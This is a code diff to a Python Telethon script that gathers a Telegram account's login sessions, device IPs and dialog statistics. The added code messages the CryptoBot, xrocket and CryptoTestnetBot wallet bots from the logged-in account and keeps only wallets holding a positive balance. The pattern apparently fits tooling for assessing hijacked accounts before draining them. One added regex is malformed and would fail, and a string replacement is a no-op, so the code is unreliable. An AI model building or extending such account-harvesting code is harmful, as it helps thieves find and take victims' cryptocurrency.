@@ -3,6 +3,9 @@ from telethon.tl.functions.users import GetFullUserRequest
 from telethon.tl.functions.account import GetAuthorizationsRequest
 import os
 from datetime import datetime
+import asyncio
+import time
+import re
 
 async def get_full_account_info(client, output_dir="dialogs"):
     info = []
@@ -23,6 +26,18 @@ async def get_full_account_info(client, output_dir="dialogs"):
             info.append(f"{dev['device_model']:<20} | {dev['platform']:<12} | {dev['app_version']:<10} | {dev['ip']:<15}")
     else:
         info.append("Нет данных об устройствах")
+
+    info.append("\n=== Крипто-кошельки ===")
+    bots = [
+        ("CryptoTestnetBot", "/wallet"),
+        ("CryptoBot", "/wallet"),
+        ("xrocket", "/wallet")
+    ]
+    
+    for bot_username, command in bots:
+        bot_data = await fetch_bot_data(client, bot_username, command)
+        info.append(f"\n🔹 @{bot_username}:")
+        info.append(bot_data.replace("≈", "≈"))
 
     info.append("\n=== Статистика диалогов ===")
     stats = {
@@ -83,6 +98,82 @@ async def get_full_account_info(client, output_dir="dialogs"):
     print(f"\nИнформация сохранена в файл: {filename}")
     
     return filename
+
+async def fetch_bot_data(client, bot_username, command):
+    try:
+        bot = await client.get_entity(bot_username)
+        await client.send_message(bot, command)
+        
+        start_time = time.time()
+        response = ""
+        
+        while time.time() - start_time < 5:
+            async for message in client.iter_messages(bot, limit=2):
+                if message.out: 
+                    continue
+                if message.date.timestamp() > start_time:
+                    response = await _filter_crypto_data(message.text)
+                    return response
+            await asyncio.sleep(1)
+            
+        return response
+        
+    except Exception as e:
+        return f"Ошибка: {str(e)}"
+
+async def _filter_crypto_data(text):
+    import re
+    positive_wallets = []
+    total_line = ""
+    header = "👛 Кошелёк"
+    
+    # Регулярное выражение для извлечения числа и валюты
+    amount_pattern = re.compile(r'([0-9]{1,3}(?:[ ,.\d]{3})*(?:\.\d+)?)\s*([A-Za-z]{3,})')
+    # Регулярное выражение для удаления markdown-ссылок, например: "[**Tether**](https://tether.to/)" -> "Tether"
+    md_link_pattern = re.compile(r'?\*?(\*?)([^\*]+)\*??[^)]+')
+    
+    for line in text.split('\n'):
+        original_line = line.strip()
+        if not original_line:
+            continue
+        
+        # Пропускаем строки с ботом
+        if original_line.startswith("🔹"):
+            continue
+        
+        # Итоговая строка
+        if original_line.startswith('≈'):
+            total_line = original_line
+            continue
+        
+        # Если строка содержит двоеточие, считаем, что это строка с информацией о кошельке
+        if ':' in original_line:
+            parts = original_line.split(':', 1)
+            wallet_name_raw = parts[0].strip()
+            # Убираем markdown-разметку из имени кошелька
+            wallet_name = md_link_pattern.sub(r'\2', wallet_name_raw)
+            wallet_name = wallet_name.replace('*', '').strip()
+            wallet_rest = parts[1].strip()
+            
+            m = amount_pattern.search(wallet_rest)
+            if m:
+                try:
+                    amount = float(m.group(1).replace(',', '').replace(' ', ''))
+                    # Если баланс больше нуля – добавляем в список
+                    if amount > 0:
+                        positive_wallets.append(f"{wallet_name}: {wallet_rest}")
+                except ValueError:
+                    continue
+
+    if positive_wallets:
+        result = [header, ""]
+        result.extend(positive_wallets)
+        if total_line:
+            result.extend(["", total_line])
+        return "\n".join(result)
+    else:
+        return "Нет активных балансов"
+
 
 async def fetch_user_info(client):
     me = await client.get_me()
